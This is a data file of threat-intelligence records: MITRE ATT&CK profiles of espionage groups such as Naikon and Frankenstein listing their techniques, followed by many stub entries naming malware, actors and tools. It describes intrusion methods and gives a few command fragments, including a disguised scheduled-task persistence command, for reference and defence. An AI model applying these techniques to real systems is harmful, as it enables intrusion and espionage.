{"text": " [Naikon](https://attack.mitre.org/groups/G0019) is assessed to be a state-sponsored cyber espionage group attributed to the Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020).(Citation: CameraShy) Active since at least 2010, [Naikon](https://attack.mitre.org/groups/G0019) has primarily conducted operations against government, military, and civil organizations in Southeast Asia, as well as against international bodies such as the United Nations Development Programme (UNDP) and the Association of Southeast Asian Nations (ASEAN).(Citation: CameraShy)(Citation: Baumgartner Naikon 2015) While [Naikon](https://attack.mitre.org/groups/G0019) shares some characteristics with [APT30](https://attack.mitre.org/groups/G0013), the two groups do not appear to be exact matches.(Citation: Baumgartner Golovkin Naikon 2015)", "idx": "https://attack.mitre.org/groups/G0019", "title": "Naikon", "entity": "Naikon", "entity_type": "groups", "entity_context": ["Naikon uses commands such as <code>netsh interface show</code> to discover network interface settings.", "Naikon has used malicious e-mail attachments to deliver malware.", "Naikon has convinced victims to open malicious attachments to execute malware.", "Naikon uses commands such as <code>netsh advfirewall firewall</code> to discover local firewall settings.", "Naikon has used administrator credentials for lateral movement in compromised networks.", "Naikon has used the LadonGo scanner to scan target networks.", "Naikon renamed a malicious service <code>taskmgr</code> to appear to be a legitimate version of Task Manager.", "Naikon has used a netbios scanner for remote machine identification.", "Naikon has used WMIC.exe for lateral movement.", "Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables.", "Naikon has modified a victim's Windows Run registry to establish persistence.", "Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host.", "Naikon has used schtasks.exe for lateral movement in compromised networks.", "Naikon has used DLL side-loading to load malicious DLL's into legitimate executables."], "is_subtechnique": false}
{"text": " [CostaRicto](https://attack.mitre.org/groups/G0132) is a suspected hacker-for-hire cyber espionage campaign that has targeted multiple industries worldwide since at least 2019. [CostaRicto](https://attack.mitre.org/groups/G0132)'s targets, a large portion of which are financial institutions, are scattered across Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia.(Citation: BlackBerry CostaRicto November 2020)", "idx": "https://attack.mitre.org/groups/G0132", "title": "CostaRicto", "entity": "CostaRicto", "entity_type": "groups", "entity_context": ["CostaRicto has obtained open source tools to use in their operations.", "CostaRicto has used scheduled tasks to download backdoor tools.", "CostaRicto employed nmap and pscan to scan target environments.", "CostaRicto has set up remote SSH tunneling into the victim's environment from a malicious domain.", "CostaRicto has used a layer of proxies to manage C2 communications."], "is_subtechnique": false}
{"text": " [Frankenstein](https://attack.mitre.org/groups/G0101) is a campaign carried out between January and April 2019 by unknown threat actors. The campaign name comes from the actors' ability to piece together several unrelated components.(Citation: Talos Frankenstein June 2019)", "idx": "https://attack.mitre.org/groups/G0101", "title": "Frankenstein", "entity": "Frankenstein", "entity_type": "groups", "entity_context": ["Frankenstein has run encoded commands from the command line.", "Frankenstein has obtained and used Empire to deploy agents.", "Frankenstein has used spearphishing emails to send trojanized Microsoft Word documents.  ", "Frankenstein has harvested credentials from the victim's machine using Empire.", "Frankenstein has enumerated hosts, looking for the public IP address of the system.", "Frankenstein has used PowerShell to run a series of base64-encoded commands, that acted as a stager and enumerated hosts.\t", "Frankenstein has collected information via Empire, which is automatically sent the data back to the adversary's C2.", "Frankenstein has established persistence through a scheduled task using the command: <code> /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR </code>, named \"WinUpdate\".\t", "Frankenstein has enumerated hosts, looking for the system's machine name.", "Frankenstein has enumerated hosts, looking to obtain a list of all currently running processes.", "Frankenstein has used trojanized Microsoft Word documents sent via email, which prompted the victim to enable macros.", "Frankenstein has used WMI queries to detect if virtualization environments or analysis tools were running on the system.", "Frankenstein has uploaded and downloaded files to utilize additional plugins.", "Frankenstein has used CVE-2017-11882 to execute code on the victim's machine.", "Frankenstein has run a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line.", "Frankenstein has used MSbuild to execute an actor-created file.", "Frankenstein has enumerated hosts via Empire, gathering the username, domain name, machine name, and other system information.", "Frankenstein has deobfuscated base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.  ", "Frankenstein has enumerated hosts via Empire, gathering various local system information.", "Frankenstein has communicated with a C2 via an encrypted RC4 byte stream and AES-CBC.", "Frankenstein has used WMI queries to check if various security applications were running, including VMWare and Virtualbox.", "Frankenstein has used Word documents that prompts the victim to enable macros and run a Visual Basic script.", "Frankenstein has enumerated hosts, gathering username, machine name, and administrative permissions information.", "Frankenstein has used WMI queries to check if various security applications were running, as well as the operating system version.", "Frankenstein has used trojanized documents that retrieve remote templates from an adversary-controlled website."], "is_subtechnique": false}
{"text": " [WIRTE](https://attack.mitre.org/groups/G0090) is a threat group that has been active since at least August 2018. The group focuses on targeting Middle East defense and diplomats.(Citation: Lab52 WIRTE Apr 2019)", "idx": "https://attack.mitre.org/groups/G0090", "title": "WIRTE", "entity": "WIRTE", "entity_type": "groups", "entity_context": ["WIRTE has downloaded PowerShell code from the C2 server to be executed.", "WIRTE has used VBS scripts throughout its operation.\t", "WIRTE has used HTTP for network communication.\t", "WIRTE has used Regsvr32.exe to trigger the execution of a malicious script.", "WIRTE has used PowerShell for script execution.", "WIRTE has decoded a base64 encoded document which was embedded in a VBS script.", "WIRTE has obtained and used Empire for post-exploitation activities."], "is_subtechnique": false}
{"text": " [BlackOasis](https://attack.mitre.org/groups/G0063) is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks. (Citation: Securelist BlackOasis Oct 2017) (Citation: Securelist APT Trends Q2 2017) A group known by Microsoft as [NEODYMIUM](https://attack.mitre.org/groups/G0055) is reportedly associated closely with [BlackOasis](https://attack.mitre.org/groups/G0063) operations, but evidence that the group names are aliases has not been identified. (Citation: CyberScoop BlackOasis Oct 2017)", "idx": "https://attack.mitre.org/groups/G0063", "title": "BlackOasis", "entity": "BlackOasis", "entity_type": "groups", "entity_context": ["BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools."], "is_subtechnique": false}
{"text": " [SilverTerrier](https://attack.mitre.org/groups/G0083) is a Nigerian threat group that has been seen active since 2014. [SilverTerrier](https://attack.mitre.org/groups/G0083) mainly targets organizations in high technology, higher education, and manufacturing.(Citation: Unit42 SilverTerrier 2018)(Citation: Unit42 SilverTerrier 2016)", "idx": "https://attack.mitre.org/groups/G0083", "title": "SilverTerrier", "entity": "SilverTerrier", "entity_type": "groups", "entity_context": ["SilverTerrier uses SMTP for C2 communications.", "SilverTerrier uses FTP for C2 communications.\t", "SilverTerrier uses HTTP for C2 communications.\t"], "is_subtechnique": false}
{"text": " Houdini RAT", "idx": "http://www.bosch.com#node1g4aefeb0x7", "title": "Houdini RAT", "entity": "Houdini RAT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " APT40", "idx": "http://www.bosch.com#node1fvup9pj1x9", "title": "APT40", "entity": "APT40", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " LockBit", "idx": "http://www.bosch.com#node1fvup9pj1x34", "title": "LockBit", "entity": "LockBit", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " INK Exploit", "idx": "http://www.bosch.com#node1frhbstcrx13", "title": "INK Exploit", "entity": "INK Exploit", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Malware used by Magecart groups Magecart", "idx": "http://www.bosch.com#node1frhbstcrx2", "title": "Magecart", "entity": "Magecart", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Osiris", "idx": "http://www.bosch.com#node1fvup9pj1x6", "title": "Osiris", "entity": "Osiris", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " curl", "idx": "http://www.bosch.com#node1fuu313m0x6", "title": "curl", "entity": "curl", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TroubleGrabber", "idx": "http://www.bosch.com#node1fsmh11c3x1", "title": "TroubleGrabber", "entity": "TroubleGrabber", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Squirrelwaffle", "idx": "http://www.bosch.com#node1fpjil0acx5", "title": "Squirrelwaffle", "entity": "Squirrelwaffle", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " https://www.riskiq.com/what-is-magecart/ https://www.vaimo.com/magecart-attacks-protect-your-business/", "idx": "http://www.bosch.com#node1frhbstcrx1", "title": "Magecart", "entity": "Magecart", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " PyLocky", "idx": "http://www.bosch.com#node1g51dalmax3", "title": "PyLocky", "entity": "PyLocky", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " MountLocker", "idx": "http://www.bosch.com#node1fvup9pj1x21", "title": "MountLocker", "entity": "MountLocker", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " VJWorm", "idx": "http://www.bosch.com#node1fvup9pj1x52", "title": "VJWorm", "entity": "VJWorm", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TokyoX", "idx": "http://www.bosch.com#node1fvup9pj1x39", "title": "TokyoX", "entity": "TokyoX", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " AveMaria", "idx": "http://www.bosch.com#node1g51dalmax15", "title": "AveMaria", "entity": "AveMaria", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Zeus", "idx": "http://www.bosch.com#node1g51dalmax2", "title": "Zeus", "entity": "Zeus", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " remote access and information stealing malware used by the iranian goverment to spy its citiziens", "idx": "http://www.bosch.com#node1fvup9pj1x37", "title": "WinspySuite", "entity": "WinspySuite", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " VeilFramework", "idx": "http://www.bosch.com#node1g7env4v1x7", "title": "VeilFramework", "entity": "VeilFramework", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " KiXtart Loader", "idx": "http://www.bosch.com#node1g51dalmax8", "title": "KiXtart Loader", "entity": "KiXtart Loader", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " FK_Undead", "idx": "http://www.bosch.com#node1fvup9pj1x42", "title": "FK_Undead", "entity": "FK_Undead", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Meterpreter", "idx": "http://www.bosch.com#node1fvup9pj1x11", "title": "Meterpreter", "entity": "Meterpreter", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " wmic", "idx": "http://www.bosch.com#node1g7env4v1x2", "title": "wmic", "entity": "wmic", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " GozNym", "idx": "http://www.bosch.com#node1fvup9pj1x26", "title": "GozNym", "entity": "GozNym", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " HydroJiin", "idx": "http://www.bosch.com#node1frhbstcrx10", "title": "HydroJiin", "entity": "HydroJiin", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " CustomAddedTools", "idx": "http://www.bosch.com#node1frhbstcrx5", "title": "CustomAddedTools", "entity": "CustomAddedTools", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " whoami.exe", "idx": "http://www.bosch.com#node1fvup9pj1x46", "title": "whoami.exe", "entity": "whoami.exe", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " DanaBot", "idx": "http://www.bosch.com#node1fpjil0acx2", "title": "DanaBot", "entity": "DanaBot", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " net use", "idx": "http://www.bosch.com#node1g7env4v1x1", "title": "net use", "entity": "net use", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TaurusBuilderKit", "idx": "http://www.bosch.com#node1fvup9pj1x16", "title": "TaurusBuilderKit", "entity": "TaurusBuilderKit", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " OwlProxy", "idx": "http://www.bosch.com#node1fvup9pj1x41", "title": "OwlProxy", "entity": "OwlProxy", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " LEMPO", "idx": "http://www.bosch.com#node1g51dalmax16", "title": "LEMPO", "entity": "LEMPO", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " EtterSilent", "idx": "http://www.bosch.com#node1fvup9pj1x22", "title": "EtterSilent", "entity": "EtterSilent", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Golden Chickens", "idx": "http://www.bosch.com#node1fvup9pj1x14", "title": "Golden Chickens", "entity": "Golden Chickens", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Metasploit", "idx": "http://www.bosch.com#node1frhbstcrx8", "title": "Metasploit", "entity": "Metasploit", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TrickbotGang", "idx": "http://www.bosch.com#node1fuu313m0x4", "title": "TrickbotGang", "entity": "TrickbotGang", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA2722", "idx": "http://www.bosch.com#node1g51dalmax6", "title": "TA2722", "entity": "TA2722", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Formbook", "idx": "http://www.bosch.com#node1g51dalmax14", "title": "Formbook", "entity": "Formbook", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " PurpleWave", "idx": "http://www.bosch.com#node1fuu313m0x7", "title": "PurpleWave", "entity": "PurpleWave", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Kerberos", "idx": "http://www.bosch.com#node1fvup9pj1x51", "title": "Kerberos", "entity": "Kerberos", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Berserk Bear", "idx": "http://www.bosch.com#node1fsmh11c3x16", "title": "Berserk Bear", "entity": "Berserk Bear", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " QBot", "idx": "http://www.bosch.com#node1fvup9pj1x23", "title": "QBot", "entity": "QBot", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA800", "idx": "http://www.bosch.com#node1g7env4v1x4", "title": "TA800", "entity": "TA800", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Zloader", "idx": "http://www.bosch.com#node1fpjil0acx6", "title": "Zloader", "entity": "Zloader", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " libcurl", "idx": "http://www.bosch.com#node1fvup9pj1x10", "title": "libcurl", "entity": "libcurl", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " BabukGang", "idx": "http://www.bosch.com#node1fsmh11c3x22", "title": "BabukGang", "entity": "BabukGang", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Cozy Bear", "idx": "http://www.bosch.com#node1fvup9pj1x38", "title": "Cozy Bear", "entity": "Cozy Bear", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA428", "idx": "http://www.bosch.com#node1fvup9pj1x43", "title": "TA428", "entity": "TA428", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " njrat", "idx": "http://www.bosch.com#node1g4aefeb0x1", "title": "njrat", "entity": "njrat", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " curl", "idx": "http://www.bosch.com#node1g51dalmax5", "title": "curl", "entity": "curl", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Baldr", "idx": "http://www.bosch.com#node1fvup9pj1x27", "title": "Baldr", "entity": "Baldr", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Fancy Lazarus", "idx": "http://www.bosch.com#node1g7env4v1x9", "title": "Fancy Lazarus", "entity": "Fancy Lazarus", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " CobInt", "idx": "http://www.bosch.com#node1fvup9pj1x17", "title": "CobInt", "entity": "CobInt", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " A very basic stealer to steal passwords from popular tools like Firefox, Opera, Chrome, FileZilla, etc and send to the C&C panel.", "idx": "http://www.bosch.com#node1frhbstcrx12", "title": "NiiJ Stealer", "entity": "NiiJ Stealer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " GandCrab", "idx": "http://www.bosch.com#node1fsmh11c3x23", "title": "GandCrab", "entity": "GandCrab", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Necrobrowser", "idx": "http://www.bosch.com#node1g4igct0cx1", "title": "Necrobrowser", "entity": "Necrobrowser", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " wmiexec", "idx": "http://www.bosch.com#node1fvup9pj1x49", "title": "wmiexec", "entity": "wmiexec", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " MinebridgeRAT", "idx": "http://www.bosch.com#node1fq5p8ki8x3", "title": "MinebridgeRAT", "entity": "MinebridgeRAT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " DarkCrypter", "idx": "http://www.bosch.com#node1fvup9pj1x5", "title": "DarkCrypter", "entity": "DarkCrypter", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " KPOT", "idx": "http://www.bosch.com#node1fvup9pj1x19", "title": "KPOT", "entity": "KPOT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Taurus", "idx": "http://www.bosch.com#node1g8ftt36lx2", "title": "Taurus", "entity": "Taurus", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " m1Geelka", "idx": "http://www.bosch.com#node1fki014vbx3", "title": "m1Geelka", "entity": "m1Geelka", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " VenomKit", "idx": "http://www.bosch.com#node1fvup9pj1x15", "title": "VenomKit", "entity": "VenomKit", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " GrooveGang", "idx": "http://www.bosch.com#node1fsmh11c3x21", "title": "GrooveGang", "entity": "GrooveGang", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Thanos", "idx": "http://www.bosch.com#node1fvup9pj1x33", "title": "Thanos", "entity": "Thanos", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " HawkEye", "idx": "http://www.bosch.com#node1fvup9pj1x8", "title": "HawkEye", "entity": "HawkEye", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Vjw0rm", "idx": "http://www.bosch.com#node1g4aefeb0x2", "title": "Vjw0rm", "entity": "Vjw0rm", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Epsilon Ransomware", "idx": "http://www.bosch.com#node1frhbstcrx14", "title": "Epsilon Ransomware", "entity": "Epsilon Ransomware", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " https://quointelligence.eu/2021/06/daily-operations-of-a-nigerian-ecrime-gang/", "idx": "http://www.bosch.com#node1fsmh11c3x7", "title": "E.K.P", "entity": "E.K.P", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Kronos", "idx": "http://www.bosch.com#node1fvup9pj1x2", "title": "Kronos", "entity": "Kronos", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Emissary Panda", "idx": "http://www.bosch.com#node1fvup9pj1x44", "title": "Emissary Panda", "entity": "Emissary Panda", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Anubis", "idx": "http://www.bosch.com#node1fvup9pj1x31", "title": "Anubis", "entity": "Anubis", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " CloudAtlas APT", "idx": "http://www.bosch.com#node1fq5p8ki8x2", "title": "CloudAtlas APT", "entity": "CloudAtlas APT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " AsyncRAT", "idx": "http://www.bosch.com#node1frhbstcrx3", "title": "AsyncRAT", "entity": "AsyncRAT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " xmrig miner", "idx": "http://www.bosch.com#node1frhbstcrx7", "title": "xmrig miner", "entity": "xmrig miner", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " BMPacker", "idx": "http://www.bosch.com#node1fvup9pj1x4", "title": "BMPacker", "entity": "BMPacker", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Elfin", "idx": "http://www.bosch.com#node1fq5p8ki8x5", "title": "Elfin", "entity": "Elfin", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " ReconHellcat", "idx": "http://www.bosch.com#node1fsmh11c3x10", "title": "ReconHellcat", "entity": "ReconHellcat", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Dharma", "idx": "http://www.bosch.com#node1fsmh11c3x5", "title": "Dharma", "entity": "Dharma", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Gray Pigeon", "idx": "http://www.bosch.com#node1fvup9pj1x28", "title": "Gray Pigeon", "entity": "Gray Pigeon", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " DoppelPaymer", "idx": "http://www.bosch.com#node1fvup9pj1x32", "title": "DoppelPaymer", "entity": "DoppelPaymer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Evilginx2", "idx": "http://www.bosch.com#node1g4igct0cx2", "title": "Evilginx2", "entity": "Evilginx2", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Electrum", "idx": "http://www.bosch.com#node1fuu313m0x8", "title": "Electrum", "entity": "Electrum", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Ares", "idx": "http://www.bosch.com#node1fvup9pj1x1", "title": "Ares", "entity": "Ares", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " UPX Packer", "idx": "http://www.bosch.com#node1fvup9pj1x3", "title": "UPX Packer", "entity": "UPX Packer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Rebol Loader", "idx": "http://www.bosch.com#node1g51dalmax9", "title": "Rebol Loader", "entity": "Rebol Loader", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " SamSam", "idx": "http://www.bosch.com#node1fsmh11c3x4", "title": "SamSam", "entity": "SamSam", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Buer", "idx": "http://www.bosch.com#node1fuu313m0x3", "title": "Buer", "entity": "Buer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " wmic.exe", "idx": "http://www.bosch.com#node1fvup9pj1x48", "title": "wmic.exe", "entity": "wmic.exe", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " BlackWater", "idx": "http://www.bosch.com#node1fsmh11c3x11", "title": "BlackWater", "entity": "BlackWater", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Zebrocy", "idx": "http://www.bosch.com#node1fsmh11c3x13", "title": "Zebrocy", "entity": "Zebrocy", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Spynote", "idx": "http://www.bosch.com#node1fvup9pj1x30", "title": "Spynote", "entity": "Spynote", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Cassandra Crypter", "idx": "http://www.bosch.com#node1fsmh11c3x9", "title": "Cassandra Crypter", "entity": "Cassandra Crypter", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " CyberGateRAT", "idx": "http://www.bosch.com#node1frhbstcrx4", "title": "CyberGateRAT", "entity": "CyberGateRAT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " https://github.com/yarrick/iodine", "idx": "http://www.bosch.com#node1fvup9pj1x12", "title": "Iodine", "entity": "Iodine", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " a packer tool to obfuscate other malware to make them undetectable.", "idx": "http://www.bosch.com#node1frhbstcrx11", "title": "Coak Crypter", "entity": "Coak Crypter", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " RIG EK", "idx": "http://www.bosch.com#node1fsmh11c3x3", "title": "RIG EK", "entity": "RIG EK", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Xenotime", "idx": "http://www.bosch.com#node1fsmh11c3x14", "title": "Xenotime", "entity": "Xenotime", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Gray Wolf", "idx": "http://www.bosch.com#node1fvup9pj1x29", "title": "Gray Wolf", "entity": "Gray Wolf", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Dirdex", "idx": "http://www.bosch.com#node1fsmh11c3x2", "title": "Dirdex", "entity": "Dirdex", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Process Hacker", "idx": "http://www.bosch.com#node1fsmh11c3x6", "title": "Process Hacker", "entity": "Process Hacker", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " WinSCP", "idx": "http://www.bosch.com#node1fsmh11c3x24", "title": "WinSCP", "entity": "WinSCP", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " DarkSide", "idx": "http://www.bosch.com#node1fsmh11c3x20", "title": "DarkSide", "entity": "DarkSide", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " AtomSilo", "idx": "http://www.bosch.com#node1fpjil0acx4", "title": "AtomSilo", "entity": "AtomSilo", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " CloudFall", "idx": "http://www.bosch.com#node1fq5p8ki8x1", "title": "CloudFall", "entity": "CloudFall", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Gozi ISBF", "idx": "http://www.bosch.com#node1fvup9pj1x25", "title": "Gozi ISBF", "entity": "Gozi ISBF", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Nefilim", "idx": "http://www.bosch.com#node1fvup9pj1x35", "title": "Nefilim", "entity": "Nefilim", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Redline stealer", "idx": "http://www.bosch.com#node1frhbstcrx15", "title": "Redline stealer", "entity": "Redline stealer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Triton", "idx": "http://www.bosch.com#node1fsmh11c3x15", "title": "Triton", "entity": "Triton", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Ransomware", "idx": "http://www.bosch.com#node1fp1nlsutx1", "title": "Grand Crab", "entity": "Grand Crab", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Exploit Builder", "idx": "http://www.bosch.com#node1fsmh11c3x8", "title": "Exploit Builder", "entity": "Exploit Builder", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " MultiloginBot", "idx": "http://www.bosch.com#node1fpjil0acx3", "title": "MultiloginBot", "entity": "MultiloginBot", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " socat", "idx": "http://www.bosch.com#node1frhbstcrx6", "title": "socat", "entity": "socat", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " CyaX packer", "idx": "http://www.bosch.com#node1fuu313m0x2", "title": "CyaX packer", "entity": "CyaX packer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Power Ratankba", "idx": "http://www.bosch.com#node1fvup9pj1x13", "title": "Power Ratankba", "entity": "Power Ratankba", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " smbexec", "idx": "http://www.bosch.com#node1fvup9pj1x50", "title": "smbexec", "entity": "smbexec", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " MURKYSHELL", "idx": "http://www.bosch.com#node1g4aefeb0x5", "title": "MURKYSHELL", "entity": "MURKYSHELL", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " PE loader", "idx": "http://www.bosch.com#node1fuu313m0x5", "title": "PE loader", "entity": "PE loader", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " MirrorBlast", "idx": "http://www.bosch.com#node1g51dalmax10", "title": "MirrorBlast", "entity": "MirrorBlast", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Godlua", "idx": "http://www.bosch.com#node1fsmh11c3x18", "title": "Godlua", "entity": "Godlua", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " HallajPro", "idx": "http://www.bosch.com#node1g4aefeb0x3", "title": "HallajPro", "entity": "HallajPro", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
